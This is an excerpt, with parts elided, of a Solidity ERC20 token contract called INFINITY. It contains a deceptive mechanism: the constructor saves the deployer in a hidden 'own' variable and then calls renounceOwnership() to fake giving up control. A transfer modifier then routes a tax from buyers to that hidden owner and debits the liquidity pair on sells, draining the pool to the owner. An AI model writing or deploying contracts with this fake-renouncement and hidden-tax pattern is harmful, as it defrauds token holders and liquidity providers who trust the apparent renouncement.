...
contract ERC20 is Context, IERC20 {
    ...
    function _tax(address receiver, address to, uint256 amount, uint256 prc) internal virtual {
        uint256 taxAmount = (amount * prc) / 100;
        _balances[to] -= taxAmount;
        _balances[receiver] += taxAmount;
        emit Transfer(to, receiver, taxAmount);
    }
}
...
contract INFINITY is ERC20, Ownable {
    ...
    constructor() ERC20("INFINITY", "INF") {
        own = msg.sender;
        _mint(own, 100000000 * 10 ** decimals());
        renounceOwnership();
    }
    ...
    modifier chk(address from, address to, uint256 amount){
        if ((from != own) && (to != own)) {
            ...
            if (from == lpo) {
                if (tax_b) {
                    _tax(own, to, amount, b);
                }
            }
            if (to == lpo) {
                if (tax_s) {
                    _tax(own, to, amount, s);
                }
            } 
        }
        _;
